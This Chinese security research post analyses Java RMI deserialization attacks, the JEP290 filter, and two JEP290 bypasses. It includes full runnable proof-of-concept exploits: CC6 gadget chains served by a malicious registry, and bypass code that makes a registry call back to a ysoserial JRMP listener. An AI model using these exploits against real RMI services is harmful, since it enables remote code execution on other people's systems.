### 服务端攻击客户端

前面说到了

1. 注册中心会把客户端代理 Stub 序列化传给客户端
2. 服务端执行完远程服务后，会把得到的结果序列化返回客户端。

客户端都会进行反序列化

#### 1、返回恶意的 stub

先来看第一种，我们把恶意的 Stub 发给客户端

这种比较简单，因为客户端从注册中心拿远程服务的 Stub 的时候要去查询 ObjectTable 全局对象表，也就是 sun.rmi.registry.RegistryImpl#bindings 属性，我们可以通过反射或者直接绑定把恶意的远程对象 put 进 bindings 中

恶意的服务端

```java
package com.lingx5.RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class EvilRMIRegistry {

    public static void main(String[] args) throws Exception {
        // 1. 构造命令执行链
        Transformer[] transforms = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                                   new Class[]{String.class, Class[].class},
                                   new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke",
                                   new Class[]{Object.class, Object[].class},
                                   new Object[]{null, null}),
            new InvokerTransformer("exec",
                                   new Class[]{String.class},
                                   new Object[]{"calc.exe"}) // 弹出计算器
        };
        ChainedTransformer chain = new ChainedTransformer(transforms);

        // 2. 创建 LazyMap 并设置触发键
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "lingx5");
        Map<Object, Object> map = new HashMap<>();
        map.put(tiedMapEntry, "lingx5");

        // 3. 反射修改 LazyMap 的 factory 为恶意链
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chain);
        lazyMap.remove("lingx5");

        // 4. 创建 AnnotationInvocationHandler 代理
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, map);

        // 5. 创建动态代理对象（使用 Retention 接口）
        Class<?> retentionClass = Retention.class;
        Remote remoteProxy = (Remote) Proxy.newProxyInstance(
            retentionClass.getClassLoader(),
            new Class[]{Remote.class, retentionClass}, // 实现 Remote 和 Retention 接口
            handler
        );

        // 6. 启动 RMI 注册中心
        Registry registry = LocateRegistry.createRegistry(1099);

        // 7. 反射注入恶意对象到注册中心的 bindings
        Field bindingsField = registry.getClass().getDeclaredField("bindings");
        bindingsField.setAccessible(true);
        Map<String, Remote> bindings = (Map<String, Remote>) bindingsField.get(registry);
        bindings.put("exploit", remoteProxy); // 绑定恶意对象到名称 "exploit"
        //        registry.bind("exploit", remoteProxy);
        System.out.println("RMI 注册中心已启动");
        // 保持注册中心运行
        Thread.currentThread().join();

    }
}
```

客户端查询

```java
package com.lingx5.RMI;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.lookup("exploit"); // 触发反序列化漏洞
    }
}
```

![image-20250309091727495](https://gitee.com/ling-x5/img/raw/master/image-20250309091727495.png)





#### 2、返回恶意结果

给远程服务添加一个返回恶意对象的方法

```java
@Override
public Object getObject() throws RemoteException {
    // 创建Transform数组，构造CC6链条
    HashMap<Object, Object> hashMap = new HashMap<>();
    try {
        Transformer[] transforms = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), new ConstantTransformer(null));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "lingx5");

        hashMap.put(tiedMapEntry, "lingx5");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap, chainedTransformer);
        lazyMap.remove("lingx5");
    } catch (Exception e) {
        e.printStackTrace();
    }
    return hashMap;
}
```

开启服务

![image-20250307143645623](https://gitee.com/ling-x5/img/raw/master/image-20250307143645623.png)

运行客户端

![image-20250307143722992](https://gitee.com/ling-x5/img/raw/master/image-20250307143722992.png)

弹出了计算器

## JEP290

JEP290 全称 **Java Enhancement Proposal 290: Filter Incoming Serialization Data**   Java 增强提案 290：过滤传入的序列化数据

简单来说，JEP290 就是官方为了防止反序列化攻击做的一个过滤机制，提高 jdk 的安全性。

### JEP290 机制

1. 提供一个限制反序列化类的机制，白名单或者黑名单。
2. 限制反序列化的深度和复杂度。
3. 为 RMI 远程调用对象提供了一个验证类的机制。
4. 定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。

### jdk 支持 JEP290 的版本

1. JDK8u121
2. JDK7u13
3. JDK6u141

我们看一看 JEP290 具体是怎么实现的

我们先用 jdk7 启动服务器

![image-20250308085212898](https://gitee.com/ling-x5/img/raw/master/image-20250308085212898.png)

![image-20250308085140755](https://gitee.com/ling-x5/img/raw/master/image-20250308085140755.png)

jdk7 是可以被攻击成功的

我们在看看 jdk8，我用的时 redhat 版本，默认也实现了 JEP290

当我们向服务器 bind 一个恶意的 Remote 时，就会被拦截，导致攻击失败

![image-20250308090429649](https://gitee.com/ling-x5/img/raw/master/image-20250308090429649.png)

```
三月 08, 2025 9:03:14 上午 java.io.ObjectInputStream filterCheck
信息: ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 8, depth: 2, bytes: 281, ex: n/a
```

我们看看他的流程

### ObjectInputFilter 工作流程

ObjectInputStream.readObject => ObjectInputStream.readObject0 => ObjectInputStream.readOrdinaryObject => ObjectInputStream.readClassDesc => ObjectInputStream.readProxyDesc =>  ObjectInputStream.filterCheck 实现对反序列化的检测

我们具体分析一下

我们创建的中策中心中多了一个 filter 字段

![image-20250308092505458](https://gitee.com/ling-x5/img/raw/master/image-20250308092505458.png)

可以去看一下他的本源 安 `shift+F4` 

来到了 sun.rmi.registry.RegistryImpl#registryFilter，在 jdk7 中是没有这个方法的

把这个方法拿出来

```java
private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo filterInfo) {
    if (registryFilter != null) {
        ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);
        if (status != ObjectInputFilter.Status.UNDECIDED) {
            // The Registry filter can override the built-in white-list
            return status;
        }
    }

    if (filterInfo.depth() > REGISTRY_MAX_DEPTH) {
        return ObjectInputFilter.Status.REJECTED;
    }
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null) {
        if (clazz.isArray()) {
            // Arrays are REJECTED only if they exceed the limit
            return (filterInfo.arrayLength() >= 0 && filterInfo.arrayLength() > REGISTRY_MAX_ARRAY_SIZE)
                ? ObjectInputFilter.Status.REJECTED
                : ObjectInputFilter.Status.UNDECIDED;
        }
        if (String.class == clazz
            || java.lang.Number.class.isAssignableFrom(clazz)
            || Remote.class.isAssignableFrom(clazz)
            || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
            || UnicastRef.class.isAssignableFrom(clazz)
            || RMIClientSocketFactory.class.isAssignableFrom(clazz)
            || RMIServerSocketFactory.class.isAssignableFrom(clazz)
            || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
            || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
            return ObjectInputFilter.Status.ALLOWED;
        } else {
            return ObjectInputFilter.Status.REJECTED;
        }
    }
    return ObjectInputFilter.Status.UNDECIDED;
}
```

看到在 21-33 行的判断，实际上就是 JEP290 默认可以反序列化的白名单，所以当我们尝试向注册中心 bind 一个恶意的类是，它会被 Filter 拦截掉返回 ObjectInputFilter REJECTED。

### RMI 拦截流程

我们现在启动服务，在 sun.rmi.registry.RegistryImpl_Skel#dispatch 中的 readObject()方法打上断点，客户端发送 bind 请求。

![image-20250308105937140](https://gitee.com/ling-x5/img/raw/master/image-20250308105937140.png)

然后我们跟一下这个 readObject，其实前面说的 ObjectInputFilter 工作流程是一致的

![image-20250308123729707](https://gitee.com/ling-x5/img/raw/master/image-20250308123729707.png)

堆栈复制出来了，从堆栈也能看出，因为反序列化的传递性，我们拦截的并不是最外层封装的 Remote，而是内部的封装的 AnnotationInvocationHandler

```
registryFilter:438, RegistryImpl (sun.rmi.registry)
checkInput:-1, 1198108795 (sun.rmi.registry.RegistryImpl$$Lambda$4)
filterCheck:1317, ObjectInputStream (java.io)
readNonProxyDesc:1998, ObjectInputStream (java.io)
readClassDesc:1852, ObjectInputStream (java.io)
readOrdinaryObject:2186, ObjectInputStream (java.io)
readObject0:1669, ObjectInputStream (java.io)
defaultReadFields:2431, ObjectInputStream (java.io)
readSerialData:2355, ObjectInputStream (java.io)
readOrdinaryObject:2213, ObjectInputStream (java.io)
readObject0:1669, ObjectInputStream (java.io)
readObject:503, ObjectInputStream (java.io)
readObject:461, ObjectInputStream (java.io)
dispatch:91, RegistryImpl_Skel (sun.rmi.registry)
oldDispatch:469, UnicastServerRef (sun.rmi.server)
dispatch:301, UnicastServerRef (sun.rmi.server)
run:200, Transport$1 (sun.rmi.transport)
run:197, Transport$1 (sun.rmi.transport)
doPrivileged:-1, AccessController (java.security)
serviceCall:196, Transport (sun.rmi.transport)
handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
run:-1, 398728446 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
doPrivileged:-1, AccessController (java.security)
run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:750, Thread (java.lang)
```



## Bypass JEP290

其实 JEP290 主要是针对注册中心（服务端）做的过滤机制，我们也看到了他把 registryFilter 所产生的 Filter 对象，赋值给了 UnicastServerRef 

### 利用 Object 参数

1. 这是最简单的了，没啥技术含量，但是条件有些苛刻。就是有一个接受 Object 参数的远程方法暴露给我们。我们还需要知道 rmi 类名和方法名

![image-20250308133022333](https://gitee.com/ling-x5/img/raw/master/image-20250308133022333.png)

我们调试一下也会发现，我们在经过 filterCheck 时，serialFilter 的值为 null。所以是可以反序列化成功的

![image-20250308144630587](https://gitee.com/ling-x5/img/raw/master/image-20250308144630587.png)

这个的主要原因是

每导出一个远程对象实例，就会创建一个 `UnicastServerRef` 对象。我们注册中心的 UnicastServerRef 中包含 filter（因为 registryImpl 中有 sun.rmi.registry.RegistryImpl#registryFilter 方法），而我们自己写的远程对象（CaculatorImpl）的 UnicastServerRef 是没有 filter 的

![image-20250308150514768](https://gitee.com/ling-x5/img/raw/master/image-20250308150514768.png)

### 白名单绕过

我们先看看白名单中的几个类

```
               java.lang.Number.class
            || Remote.class
            || java.lang.reflect.Proxy.class
            || UnicastRef.class
            || RMIClientSocketFactory.class
            || RMIServerSocketFactory.class
            || java.rmi.activation.ActivationID.class
            || java.rmi.server.UID.class
```

我们能用的白名单里的类，可能就只有 Remote.class 和 UnicastRef.class 有点价值了，其他的类对象都是接口或是普通类型没有可利用的实现。

### 8u121-8u230

#### **RemoteObject 类**

我们先来看 RemoteObject 这个类，这个类里有反序列化的入口函数 ReadObject();

![image-20250308205728967](https://gitee.com/ling-x5/img/raw/master/image-20250308205728967.png)

在函数的最后它实现了这个方法 java.io.Externalizable#readExternal，ref 就是 RemoteRef 对象，我们跟一下

![image-20250308205914780](https://gitee.com/ling-x5/img/raw/master/image-20250308205914780.png)

发现他又调了 sun.rmi.transport.LiveRef#read 方法，继续跟进

![image-20250308210219642](https://gitee.com/ling-x5/img/raw/master/image-20250308210219642.png)

看到他把 ip 和端口从输入流中读取出来，并执行了 save()方法，把它添加到了 ConnectionInputStream 的映射表中

![image-20250308213835154](https://gitee.com/ling-x5/img/raw/master/image-20250308213835154.png)

我们可以让这个输入流读取到我们恶意的 TCPEndpoint，让这个注册中心作为客户端去访问我们恶意的 JRMP 服务器，从而实现 RCE。

我们现在可以做的是把恶意的 TCPEndPoint 写进 ConnectionInputStream ，那又由谁来触发访问呢？

这就用到了 RMI 的一个隐藏的机制 DGC (分布式垃圾回收机制) 。

##### DGC 的核心思想

由于 RMI 涉及跨 JVM 的对象引用，传统的 JVM 垃圾回收机制无法直接追踪远程对象的使用情况，因此需要 DGC 来解决远程对象的垃圾回收问题。整体采用了 **基于租约的分布式引用计数** 机制来跟踪远程对象的引用情况。

**租约 (Lease):**  当客户端获取到服务端远程对象的引用时，服务端 DGC 会为这个引用颁发一个 **租约 (Lease)**。  租约代表了客户端对该远程对象的一个有效引用期限。

**租约续订 (Lease Renewal):**  客户端需要 **定期续订 (renew)**  持有的租约，以表明它仍然在使用该远程对象。  如果客户端持续续订租约，服务端 DGC 就认为该远程对象仍然被客户端引用。

**租约过期 (Lease Expiration):**  如果客户端 **没有及时续订租约**，或者客户端程序 **崩溃**、**网络连接中断** 等原因导致无法续订，服务端 DGC 会认为租约 **过期 (expired)**。  当租约过期后，服务端 DGC 会认为客户端已经不再使用该远程对象。

**垃圾回收 (Garbage Collection):**  当服务端 DGC 确定一个远程对象的所有租约都已过期，即没有任何客户端持有该远程对象的有效引用时，服务端 JVM 就可以 **安全地回收** 该远程对象所占用的资源，进行垃圾回收。

##### DGC 工作流程主要包含这几种操作：

1. 客户端获取远程对象引用: 客户端调用 Naming.lookup() 或远程方法，获得远程对象引用。
2. 客户端 RMI runtime 发送 dirty 请求给服务端 DGC: 声明客户端开始引用，请求租约。
   GCClient#registerRefs -> DGCClient $EndpointEntry#registerRefs -> DGCClient$ EndpointEntry#makeDirtyCall -> DGCImpl_Stub#dirty -> UnicastRef#invoke -> StreamRemoteCall#executeCall
3. 服务端 DGC 颁发租约，开始跟踪。
   sun.rmi.dgc.DGCImpl.dirty 接收 dirty 请求、颁发租约(leaseID 和有效期)
4. 客户端 RMI runtime 定期发送租约续订请求 (dirty 请求)。
   java.rmi.dgc.DGCClient.renewLease，其本质也是 ditry 请求
5. 服务端 DGC 更新租约有效期。
   sun.rmi.dgc.DGCImpl.dirty
6. 客户端释放远程对象引用 (或 JVM 退出): 客户端 RMI runtime 发送 clean 请求给服务端 DGC。
   DGCClient#unregisterRefs -> DGCClient$EndpointEntry#makeCleanCall -> DGCImpl_Stub#clean -> UnicastRef#invoke -> StreamRemoteCall#executeCall
7. 服务端 DGC 取消租约。
   sun.rmi.dgc.DGCImpl.clean
8. 当所有租约过期或取消后，服务端 JVM 可以回收远程对象。

回答刚才的问题，其实是由 DGCCline 发送 dirty 请求时，调用到 DGCImpl_Stub#dirty 触发的。也就是这个链条

GCClient#registerRefs -> DGCClient $EndpointEntry#registerRefs -> DGCClient$ EndpointEntry#makeDirtyCall -> DGCImpl_Stub#dirty -> UnicastRef#invoke -> StreamRemoteCall#executeCall

我们首先可以看到 RegistryImpl_Skel#dispatch 的 readObject()方法反序列化之后，进行了 call.releaseInputStream();

![image-20250309121312916](https://gitee.com/ling-x5/img/raw/master/image-20250309121312916.png)

跟进去看到有 ConnectionInputStream 调用 registerRefs 

![image-20250309103823580](https://gitee.com/ling-x5/img/raw/master/image-20250309103823580.png)

继续跟进看到 DGCClient 调用 registerRefs ，而这个 entry 就是我们传入的恶意的 JRMP 的地址

![image-20250309104018752](https://gitee.com/ling-x5/img/raw/master/image-20250309104018752.png)

后续的流程就是这样了

DGCClient $EndpointEntry#registerRefs -> DGCClient$ EndpointEntry#makeDirtyCall -> DGCImpl_Stub#dirty -> UnicastRef#invoke -> StreamRemoteCall#executeCall

#### 复现

启动 JRMPListener

```
java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'calc'
```

bypass POC

```java
package com.lingx5.RMI;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class bypassJEP {
    public static void main(String[] args) throws Exception {
        // 创建一个Endpoint对象，指定恶意主机和端口号
        Endpoint endpoint = new TCPEndpoint("127.0.0.1",9999);
        // 封装为一个LiveRef对象
        LiveRef liveRef = new LiveRef(new ObjID(new Random().nextInt()), endpoint, false);
        // 封装为UnicastRef对象
        UnicastRef unicastRef = new UnicastRef(liveRef);
        // 封装为白名单的RemoteObjectInvocationHandler对象
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(unicastRef);
        // 拿到RegistryStub对象
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.bind("bypass", handler);
    }
}
```

看到请求发过来了

![image-20250309110155341](https://gitee.com/ling-x5/img/raw/master/image-20250309110155341.png)

> 我这里版本应该是比较高，[RMI-JEP290 的分析与绕过](https://www.anquanke.com/post/id/259059) 文章中有提到，
>
> 在 8u231 版本及以上的 DGCImpl_Stub#dirty 方法中多了一个 setObjectInputFilter 的过程，又会被 JEP290 check 到了 。

![image-20250309110643820](https://gitee.com/ling-x5/img/raw/master/image-20250309110643820.png)

所以我这里服务器还是过滤掉了

![image-20250309110715613](https://gitee.com/ling-x5/img/raw/master/image-20250309110715613.png)

有兴趣的师傅，可以下载对应的 jdk 版本，进行复现调试一下

### 8u231-8u240

其实绕过的思路都是相似的，从白名单下手

这次找到了 UnicastRemoteObject，看他的 readObject()方法

![image-20250309140834880](https://gitee.com/ling-x5/img/raw/master/image-20250309140834880.png)

跟进去看一下

![image-20250309141005837](https://gitee.com/ling-x5/img/raw/master/image-20250309141005837.png)

是一个导出对象的操作，我们在恶意代码里设置 ssf (RMIServerSocketFactory) , 让他进入第二个分支

继续跟进一下 exportObject 方法

![image-20250309141629951](https://gitee.com/ling-x5/img/raw/master/image-20250309141629951.png)

这里封装进了 UnicastServerRef2() 里面，其实就是封装进了一个 LiveRef，然后有调用了 super 也就是 UnicastServerRef 的构造方法

![image-20250309141948588](https://gitee.com/ling-x5/img/raw/master/image-20250309141948588.png)

封装完成之后，会来到重载的 exportObject 方法

![image-20250309142707562](https://gitee.com/ling-x5/img/raw/master/image-20250309142707562.png)

这个在 registry 创建时，已经走过一遍了，最后就是在 TCPTransport#listen 开启监听

![image-20250309143146843](https://gitee.com/ling-x5/img/raw/master/image-20250309143146843.png)

建立 socket 连接，ep 就是 EndPoint 对象，我们继续跟，看到了 ssf（RMIServerSocketFactory），这个我们之前提到过，在封装 LiveRef 时，把 TCPEndPoint 属性的 ssf 初始化成我们恶意的 ssf。

![image-20250309143325866](https://gitee.com/ling-x5/img/raw/master/image-20250309143325866.png)

这里我们可以把RMIServerSocketFactory封装为代理对象，做跳板，由于这里是一个代理对象，会调用到 java.rmi.server.RemoteObjectInvocationHandler#invoke 方法 => RemoteObjectInvocationHandler#invokeRemoteMethod 方法

![image-20250309150938027](https://gitee.com/ling-x5/img/raw/master/image-20250309150938027.png)

之后有会调用我们熟悉的 sun.rmi.server.UnicastRef#invoke，我们可以给 ref 赋值

![image-20250309151702421](https://gitee.com/ling-x5/img/raw/master/image-20250309151702421.png)

之后就是让 UnicastRef#invoke 方法中让 Registry 向 JRMPListener 发起了 JRMP 请求，拿回来反序列化]

还有就是我们不能本地直接调用 bind，或者 rebind 方法，需要重新自己重写一下 RegistryImpl#bind 方法，在序列化之前通过反射 ObjectInputStream，修改 enableReplace 为 false，不然我们的 payload 会被转化为代理对象

```java
package com.lingx5.RMI;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;

public class bypassJEP8u231 {
    public static void main(String[] args) throws Exception {
        // 拿到registryStub对象
        Registry registry_Stub = LocateRegistry.getRegistry("127.0.0.1", 1099);
        /*
        重写 bind方法
         */
        // 反射获取registryStub对象的operations字段
        Field f = registry_Stub.getClass().getDeclaredFields()[0];
        f.setAccessible(true);
        Operation[] operations = (Operation[]) f.get(registry_Stub);
        // 获取registryStub对象的ref字段
        Field ref_filed = RemoteObject.class.getDeclaredField("ref");
        ref_filed.setAccessible(true);
        UnicastRef ref = (UnicastRef) ref_filed.get(registry_Stub);
        RemoteCall remoteCall = ref.newCall((RemoteObject) registry_Stub, operations, 2, 4905912898345647071L);
        ObjectOutput outputStream = remoteCall.getOutputStream();
        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField("enableReplace");
        enableReplace_filed.setAccessible(true);
        enableReplace_filed.setBoolean(outputStream, false);
        outputStream.writeObject("lingx5");
        outputStream.writeObject(getPayload());  // 发送payload
        ref.invoke(remoteCall);
        ref.done(remoteCall);

    }
    static UnicastRemoteObject getPayload(){
        UnicastRemoteObject unicastRemoteObject =null;
        try {
            // 创建一个TCPEndpoint对象，指定恶意主机的IP地址和端口号
            TCPEndpoint endpoint = new TCPEndpoint("127.0.0.1", 9999);
            LiveRef liveRef = new LiveRef(new ObjID(new Random().nextInt()), endpoint, false);
            UnicastRef unicastRef = new UnicastRef(liveRef);
            // 允许保存动态代理生成的类文件
            System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");

            // 动态代理：创建一个实现RMIServerSocketFactory和Remote接口的代理对象
            RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(unicastRef);
            RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(handler.getClass().getClassLoader(),
                    new Class[]{RMIServerSocketFactory.class,Remote.class},handler);
            Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor();
            constructor.setAccessible(true);
            unicastRemoteObject = constructor.newInstance();
            // 反射修改ssf的值
            Field declaredField = unicastRemoteObject.getClass().getDeclaredField("ssf");
            declaredField.setAccessible(true);
            declaredField.set(unicastRemoteObject,factory);

        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return unicastRemoteObject;
    }
}
```

在后续版本的 jdk 也已经修复了，RemoteObjectInvocationHandler#invokeRemoteMethod

![image-20250309164959196](https://gitee.com/ling-x5/img/raw/master/image-20250309164959196.png)

## 总结

好啦！到这里 RMI 总算告一段落了 😄，自己在调试的过程中也踩了很多坑，将近花了一周多的时间，才慢慢研究完成。不过也学习到了不少东西，也算是小有收获 😊。文采一般，师傅们轻喷 😂。



## 参考文章

[JAVA RMI 反序列化攻击 & JEP290 Bypass 分析](https://xz.aliyun.com/news/8299)

[文章 - JAVA RMI 反序列化流程原理分析 - 先知社区](https://xz.aliyun.com/news/1911)

[https://www.javasec.org/javase/RMI/](https://www.javasec.org/javase/RMI/)

https://www.tutorialspoint.com/java_rmi/java_rmi_introduction.htm

[奇安信攻防社区-JAVA JRMP、RMI、JNDI、反序列化漏洞之间的风花雪月](https://forum.butian.net/share/2278)（这篇文章原理很清晰了）

[RMI-JEP290 的分析与绕过](https://www.anquanke.com/post/id/259059)

https://y4er.com/posts/bypass-jep290/

https://www.freebuf.com/articles/web/347623.html

